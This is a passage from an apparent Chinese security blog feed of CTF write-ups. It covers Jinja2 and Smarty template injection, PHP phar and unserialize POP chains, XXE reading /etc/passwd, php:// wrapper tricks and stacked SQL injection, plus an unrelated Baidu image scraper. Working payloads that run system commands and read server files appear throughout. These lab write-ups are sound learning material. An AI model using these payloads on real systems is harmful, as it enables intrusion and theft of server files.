class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        return $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>根据提示，在第一个类中销毁的时候会echo $this-&gt;test;而$this-&gt;test &#x3D; $this-&gt;str;</p>
<p> 因为$this-&gt;source &#x3D; $file，所有将在第二个类中使用tostring作为pop链的一部分</p>
<p>将 $this-&gt;str;指向new Show来调用tostring方法实现&#x2F;&#x2F;$this-&gt;source &#x3D; phar:&#x2F;&#x2F;phar.jpg</p>
<p>要在第三个类中使用$text &#x3D; base64_encode(file_get_contents($value));</p>
<p>必须使得isset($this-&gt;params[$key]不为空，则应该调用__get()方法</p>
<p>将new Test赋给$this-&gt;str[‘str’]</p>
<p>可以get resource</p>
<p> 因为$value &#x3D; $this-&gt;params[$key]</p>
<p>使得params[‘resource’]&#x3D;文件路径</p>
<p>然后生成phar文件</p>
<p>路径</p>
<p>class C1e4r::__destruct() &#x3D;&gt; class Show::__toString() &#x3D;&gt; class Test::__get()、get()、file_get()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;//!!new show</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;        //!!new Test</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c=new C1e4r();</span><br><span class="line">$s=new Show();</span><br><span class="line">$t=new Test();</span><br><span class="line"></span><br><span class="line">$c-&gt;str=$s;</span><br><span class="line">$s-&gt;str[&#x27;str&#x27;]=$t;</span><br><span class="line">$t-&gt;params[&#x27;source&#x27;]=&#x27;/var/www/html/f1ag.php&#x27;;</span><br><span class="line"></span><br><span class="line">$phar = new Phar(&quot;test.phar&quot;); </span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">$phar-&gt;setMetadata($c); </span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>4.生成文件之后</p>
<p>将文件格式改为jpg，上传</p>
<p>使用phar:&#x2F;&#x2F;.&#x2F;upload&#x2F;文件名</p>
]]></content>
  </entry>
  <entry>
    <title>ssti学习</title>
    <url>/2022/12/06/hong/</url>
    <content><![CDATA[<p>1.模板引擎</p>
<p>是为了使 <strong>用户界面</strong>和 业务数据（内容）分离而产生的，它可以生成特定格式的文档，<strong>利用模板引擎来生成前端的HTML代码，模板引擎会提供一套生成HTML代码的程序，之后只需获取用户的数据，放入渲染函数，该数据便会嵌入生成好的HTML页面中</strong>，然后反馈给浏览器，呈现在用户面前</p>
<p>我们需要构造业务数据插入模板文件来进行指令</p>
<p>2.实例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var template = &#x27;&lt;p&gt;Hello,my name is &lt;%name%&gt;.I am &lt;%age%&gt; years old.&lt;/p&gt;&#x27;;</span><br><span class="line">    用于过滤出以&lt;%开头，%&gt;结尾，并且中间不包含%或&gt;的匹配项</span><br><span class="line">    其目的在于过滤出template中的 &lt;%name%&gt; 和 &lt;%age%&gt;</span><br><span class="line">var regex = /&lt;%([^%]+)?%&gt;/g;</span><br><span class="line">当正则表达式设置 `g` 标志位时，可以多次执行 `exec` 方法来查找同一个字符串中的成功匹配</span><br><span class="line">// 数据</span><br><span class="line">var data =</span><br><span class="line">&#123;</span><br><span class="line">name:&#x27;Deutsh&#x27;,413@</span><br><span class="line">    age:22</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 模板引擎</span><br><span class="line">var TemplateEngine = function (template,data)</span><br><span class="line">&#123;</span><br><span class="line">    // exec使用全局正则表达式意味着在循环中使用，因为它仍然会检索所有匹配的子表达式</span><br><span class="line">    // /regex/.exec()仅返回找到的第一个匹配项</span><br><span class="line">    while (match = regex.exec(template))</span><br><span class="line">    &#123;</span><br><span class="line">        template = template.replace(match[0],data[match[1]])</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return template;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 最终的执行在此处</span><br><span class="line"></span><br><span class="line">var string = TemplateEngine(template,data)</span><br><span class="line">console.log(string)</span><br></pre></td></tr></table></figure>

<p>因为当正则表达式设置 g 标志位时，可以多次执行exec方法来查找同一个字符串中的成功匹配</p>
<h2 id="测试是否存在ssti"><a href="#测试是否存在ssti" class="headerlink" title="测试是否存在ssti"></a>测试是否存在ssti</h2><p>就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否解析，有解析则可以判定含有 Payload 对应模板引擎注入</p>
<p>Twig实例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">　　<span class="keyword">require_once</span> <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;\twig\lib\Twig\Autoloader.php&#x27;</span>;</span><br><span class="line">　　<span class="title class_">Twig_Autoloader</span>::<span class="title function_ invoke__">register</span>(<span class="literal">true</span>);</span><br><span class="line">　　<span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">Twig_Environment</span>(<span class="keyword">new</span> <span class="title class_">Twig_Loader_String</span>());</span><br><span class="line">　　<span class="variable">$output</span> = <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&quot;Hello &#123;&#123;name&#125;&#125;&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;name&quot;</span> =&gt; <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">　　<span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>若就如我们最开始的例子所说，<strong>若模板引擎渲染的内容受我们控制了</strong>，就不一定了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$output</span>=<span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&quot;Hello <span class="subst">&#123;$_GET[&#x27;name&#x27;]&#125;</span>&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>对于Twig模板的变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;%s&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>除了传递变量外，还可以执行表达式，最简单的表达式就是<code>&#123;&#123;2*2&#125;&#125;</code>，这也是辨认是否存在ssti最基本的指纹，若我们输入4，HTML页面返回其其结果4，就说明该表达式被解析，存在ssti</p>
<p><em>python中的魔术方法</em></p>
<ul>
<li><code>__dict__</code>：保存类实例或对象实例的属性变量键值对字典</li>
<li><code>__class__</code>：返回调用的参数类型</li>
<li><code>__mro__</code>：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 <strong>寻找基类</strong></li>
<li><code>__bases__</code>：返回类型列表 <strong>寻找基类</strong></li>
<li><code>__subclasses__</code>：返回object的子类</li>
<li><code>__init__</code>：类的初始化方法</li>
<li><code>__globals__</code>：函数会以字典类型返回当前位置的全部全局变量 与<code>func_globals</code>等价</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>FlaskLight</title>
    <url>/2022/12/09/fghl/</url>
    <content><![CDATA[<h1 id="FlaskLight"><a href="#FlaskLight" class="headerlink" title="FlaskLight"></a>FlaskLight</h1><ol>
<li><p>进入题目可也看到有一个FlaskLight的提示先查看源码发现提示内容：有一个get请求方式的参数search </p>
</li>
<li><p>传递参数search并进行模板注入的测试，输入?search&#x3D;40，页面输出表达式的结果，很好可以进行模板注入，回显点在You searched for下面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">寻找执行命可以借助的类</span><br><span class="line">  获取所有继承自object的类 &#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  获取第几位，先估测是第几个，然后根据估测出来的数值尝试得到正确的值  </span><br></pre></td></tr></table></figure></li>
</ol>
<p> 经过查询后，可以借助的类&lt;class ‘warnings.catch_warnings’&gt;，没有内置os模块在第59位。</p>
<p> <img src="/2022/12/09/fghl/fir.jpg" alt="题图"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">a. 目录读取</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">b. 读取目录flasklight</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /flasklight&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/12/09/fghl/sec.jpg" alt="题图"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c. cat文件 coomme_geeeett_youur_flek 得到flag</span><br><span class="line">    &#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flasklight/coomme_geeeett_youur_flek &#x27;).read()&quot;)&#125;&#125; </span><br></pre></td></tr></table></figure>

<p><img src="/2022/12/09/fghl/3.jpg" alt="题图"></p>
]]></content>
  </entry>
  <entry>
    <title>The mystery of ip</title>
    <url>/2022/12/09/zz/</url>
    <content><![CDATA[<p>s宿舍睡</p>
<p>hint内提醒我们要在ip入手</p>
<p>先进行抓包</p>
<p>看到有X-Forwarded-For，可以看到不管我们输入什么都会回显</p>
<p><img src="/2022/12/09/zz/kkl.jpg" alt="题图"></p>
<p>输入{config}看看配置，是smarty</p>
<p>看看版本{$smarty.version}</p>
<p><img src="/2022/12/09/zz/2.jpg" alt="题图"></p>
<p>{if system(“ls”)}{&#x2F;if},这里的flag.php是假的，要查根目录下的<br>{if system(“ls &#x2F;”)}{&#x2F;if}</p>
<p><img src="/2022/12/09/zz/3.jpg" alt="题图"></p>
<p>{if system(“cat &#x2F;flag”)}{&#x2F;if}<br>还有一种表达就是直接{system(“ls”)}</p>
<p><img src="/2022/12/09/zz/4.jpg" alt="题图"></p>
]]></content>
  </entry>
  <entry>
    <title>WesternCTF2018 shrine</title>
    <url>/2022/12/12/kkk/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import flask</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return open(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)</span><br><span class="line">def shrine(shrine):</span><br><span class="line"></span><br><span class="line">    def safe_jinja(s):</span><br><span class="line">        s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;)</span><br><span class="line">        blacklist = [&#x27;config&#x27;, &#x27;self&#x27;]</span><br><span class="line">        return &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist]) + s</span><br><span class="line"></span><br><span class="line">    return flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(debug=True)</span><br></pre></td></tr></table></figure>

<p>观察得到，flag在其中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;)</span><br></pre></td></tr></table></figure>

<p>测试一下在&#x2F;shrine&#x2F;中运行ssti</p>
<p><img src="/2022/12/12/kkk/1.jpg" alt="题图"></p>
<p>有过滤，设了黑名单[‘config’,‘self’]并且过滤了括号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def safe_jinja(s):</span><br><span class="line">    s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;)</span><br><span class="line">    blacklist = [&#x27;config&#x27;, &#x27;self&#x27;]</span><br><span class="line">    return &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist]) + s</span><br></pre></td></tr></table></figure>

<p>使用两个python自带的函数来进行注入</p>
<p>url_for</p>
<p>get_flashed_message()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/shrine/&#123;&#123;url_for.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/12/12/kkk/3.jpg" alt="题图"></p>
<p>直接读取config</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/12/12/kkk/2.jpg" alt="题图"></p>
]]></content>
  </entry>
  <entry>
    <title>爬虫百度</title>
    <url>/2022/12/14/pachong/</url>
    <content><![CDATA[<p>network</p>
<p>for</p>
<p>range</p>
<p>先确定用requests库进行请求</p>
<p>使用re.findall来进行正则匹配</p>
<p>使用os库来进行保存</p>
<p>打开<a href="https://image.baidu.com/search">https://image.baidu.com/search</a></p>
<p>打开network</p>
<p>观察得到负载中的pn代表着翻页</p>
<p><img src="/2022/12/14/pachong/1.jpg" alt="题图"></p>
<p>所以在网址后面加上acjson?再利用parma&#x3D;{}的形式传参</p>
<p>伪装一下headers</p>
<p>for一下pn，使用range(start, stop, step)</p>
<p>for pn in range</p>
<ul>
<li>start: 计数从 start 开始。默认是从 0 开始。例如range（5）等价于range（0， 5）;</li>
<li>stop: 计数到 stop 结束，<strong>但不包括 stop</strong>。例如：range（0， 5） 是[0, 1, 2, 3, 4]没有5</li>
<li>step：步长，默认为1。例如：range（0， 5） 等价于 range(0, 5, 1)</li>
</ul>
<p>应该把翻页放在请求之前，可以把翻页设为第一页，且循环中有keyword，所以应该先循环再请求</p>
<p>再re.findall()中加上re.S可以遍历所有的requests；</p>
<p>写入文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">with open(os.path.join(save_dir, f&#x27;&#123;n:06d&#125;.jpg&#x27;), &#x27;wb&#x27;) as fp:</span><br><span class="line">    fp.write(image_data)</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import os</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_images_from_baidu(page_num, save_dir,keyword):</span><br><span class="line">    header = &#123;&#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36&#x27;&#125;</span><br><span class="line">    # 请求的 url</span><br><span class="line">    url = &#x27;https://image.baidu.com/search/acjson?&#x27;</span><br><span class="line">    n = 0</span><br><span class="line">    for pn in range(0, 30 * page_num, 30):</span><br><span class="line">        # 请求参数 (0, 30 * page_num, 30(步长))</span><br><span class="line">        param = &#123;&#x27;tn&#x27;: &#x27;resultjson_com&#x27;,</span><br><span class="line">                 # &#x27;logid&#x27;: &#x27;7603311155072595725&#x27;,</span><br><span class="line">                 &#x27;ipn&#x27;: &#x27;rj&#x27;,</span><br><span class="line">                 &#x27;ct&#x27;: 201326592,</span><br><span class="line">                 &#x27;is&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;fp&#x27;: &#x27;result&#x27;,</span><br><span class="line">                 &#x27;queryWord&#x27;: keyword,</span><br><span class="line">                 &#x27;cl&#x27;: 2,</span><br><span class="line">                 &#x27;lm&#x27;: -1,</span><br><span class="line">                 &#x27;ie&#x27;: &#x27;utf-8&#x27;,</span><br><span class="line">                 &#x27;oe&#x27;: &#x27;utf-8&#x27;,</span><br><span class="line">                 &#x27;adpicid&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;st&#x27;: -1,</span><br><span class="line">                 &#x27;z&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;ic&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;hd&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;latest&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;copyright&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;word&#x27;: keyword,</span><br><span class="line">                 &#x27;s&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;se&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;tab&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;width&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;height&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;face&#x27;: 0,</span><br><span class="line">                 &#x27;istype&#x27;: 2,</span><br><span class="line">                 &#x27;qc&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;nc&#x27;: &#x27;1&#x27;,</span><br><span class="line">                 &#x27;fr&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;expermode&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;force&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;cg&#x27;: &#x27;&#x27;,    # 这个参数没公开，但是不可少</span><br><span class="line">                 &#x27;pn&#x27;: pn,    # 显示：30-60-90</span><br><span class="line">                 &#x27;rn&#x27;: &#x27;30&#x27;,  # 每页显示 30 条</span><br><span class="line">                 &#x27;gsm&#x27;: &#x27;96&#x27;,</span><br><span class="line">                 &#x27;1671247792743&#x27;: &#x27;&#x27;</span><br><span class="line">                 &#125;</span><br><span class="line">        request = requests.get(url=url, headers=header, params=param)</span><br><span class="line">        if request.status_code == 200:</span><br><span class="line">            print(&#x27;Request success.&#x27;)</span><br><span class="line">        request.encoding = &#x27;utf-8&#x27;</span><br><span class="line">        # 正则方式提取图片链接</span><br><span class="line">        html = request.text</span><br><span class="line">        image_url_list = re.findall(&#x27;&quot;thumbURL&quot;:&quot;(.*?)&quot;,&#x27;, html, re.S)</span><br><span class="line">        print(image_url_list)</span><br><span class="line"></span><br><span class="line">        if not os.path.exists(save_dir):</span><br><span class="line">            os.makedirs(save_dir)</span><br><span class="line">            #创建文件夹</span><br><span class="line"></span><br><span class="line">        for image_url in image_url_list:</span><br><span class="line">            image_data = requests.get(url=image_url, headers=header).content</span><br><span class="line">            with open(os.path.join(save_dir, f&#x27;&#123;n:06d&#125;.jpg&#x27;), &#x27;wb&#x27;) as fp:</span><br><span class="line">                fp.write(image_data)</span><br><span class="line">            n = n + 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    keyword=&#x27;东北大学&#x27;</span><br><span class="line">    save_dir = keyword</span><br><span class="line">    page_num = 3</span><br><span class="line">    get_images_from_baidu(page_num, save_dir,keyword)</span><br><span class="line">    print(&#x27;Get images finished.&#x27;)</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>greatphp</title>
    <url>/2022/12/14/wu/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class SYCLOVER &#123;</span><br><span class="line">    public $syc;</span><br><span class="line">    public $lover;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123;</span><br><span class="line">           if(!preg_match(&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;, $this-&gt;syc, $match))&#123;</span><br><span class="line">               eval($this-&gt;syc);</span><br><span class="line">           &#125; else &#123;</span><br><span class="line">               die(&quot;Try Hard !!&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;great&#x27;]))&#123;</span><br><span class="line">    unserialize($_GET[&#x27;great&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>观察到反序列化的wakeup利用，syc属性会经过一次正则匹配</p>
<p>可以找一个含有__toString的类，来返回值。</p>
<p>用原生类Error</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class SYCLOVER &#123;</span><br><span class="line">    public $syc;</span><br><span class="line">    public $lover;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%d0%99%93%9e%98&quot;).&quot;?&gt;&quot;;</span><br><span class="line">$a=new Error($str,1);$b=new Error($str,2);</span><br><span class="line">$c = new SYCLOVER();</span><br><span class="line">$c-&gt;syc = $a;</span><br><span class="line">$c-&gt;lover = $b;</span><br><span class="line">echo urlencode(serialize($c));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/12/14/wu/3.jpg" alt="题图"></p>
]]></content>
  </entry>
  <entry>
    <title>xml，Fake XML cookbook</title>
    <url>/2022/12/23/wufa/</url>
    <content><![CDATA[<p>xxe漏洞触发的点 </p>
<p>可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p>
<p> XML被设计为传输和存储数据，重点是数据的内容。</p>
<p> HTML被设计用来显示数据，重点是数据的外观。</p>
<p>xml应该有关闭标签</p>
<h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>使用admin登录</p>
<p>不行</p>
<p>抓包</p>
<p><img src="/2022/12/23/wufa/1.jpg" alt="进程图"></p>
<p>根据提示想到xml注入</p>
<p>使用file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd命令查看配置文件</p>
<?xml version="1.0" encoding="utf-8"? >

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ENTITY admin SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>

![进程图](wufa/2.jpg)

发现flag位置

读取flag

<?xml version="1.0" encoding="utf-8"? >

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ENTITY admin SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>

![进程图](wufa/3.jpg)
]]></content>
  </entry>
  <entry>
    <title>NiZhuanSiWei</title>
    <url>/2022/12/20/wufaping/</url>
    <content><![CDATA[<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>1.源代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$password = $_GET[&quot;password&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file);  //useless.php</span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>2.第一层绕过</p>
<p>观察到text应该等于welcome to the zjctf</p>
<p>使用伪协议</p>
<p>data写入</p>
<p>&#x2F;?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</p>
<p>3.观察到有文件包含</p>
<p>使用php:&#x2F;&#x2F;filter&#x2F;读一下useless.php</p>
<p>&#x2F;?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</p>
<p>获得源代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"> </span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>

<p>有file_get_contents，再结合会ehco password 反序列化后的内容</p>
<p>则可以把file_get_contents里面的设为flag.php</p>
<p>4.进行序列化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Flag&#123;</span><br><span class="line">    public $file=&quot;flag.php&quot;;</span><br><span class="line">    public function __tostring()&#123;</span><br><span class="line">        if(isset($this-&gt;file))&#123;</span><br><span class="line">            echo file_get_contents($this-&gt;file);</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new Flag;</span><br><span class="line">print_r(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/12/20/wufaping/1.jpg" alt="进程图"></p>
<p>O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p>
<p>最后拼接</p>
<p>&#x2F;?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p>
<p>得到flag</p>
<p><img src="/2022/12/20/wufaping/2.jpg" alt="进程图"></p>
]]></content>
  </entry>
  <entry>
    <title>EasySQL</title>
    <url>/2022/12/20/wufapingjia/</url>
    <content><![CDATA[<h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><p>information_schema.tables都被过滤</p>
<p>报错注入，时间盲注也被过滤</p>
<p>尝试堆查询注入</p>
<p>发现flag也被过滤</p>
<p>通过输入非零数字得到的回显1和输入其余字符得不到回显来判断出内部的查询语句可能存在有||</p>
<p>使用||如果第一个存在则不会查询第二个  相当于内置了一个select</p>
<p>在 查看数据表中有一个指向flag，所以应该查的是flag</p>
<p>查资料得到  set sql_mode&#x3D;pipes_as_concat可以将||的作用由or变为拼接字符串</p>
<p>可以把输入的内容跟flag from xxx拼接起来</p>
<p>在后面加上select 1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?query=1;set sql_mode=PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>Ezsql</title>
    <url>/2022/12/26/%E7%AC%94%E8%AE%B0/</url>
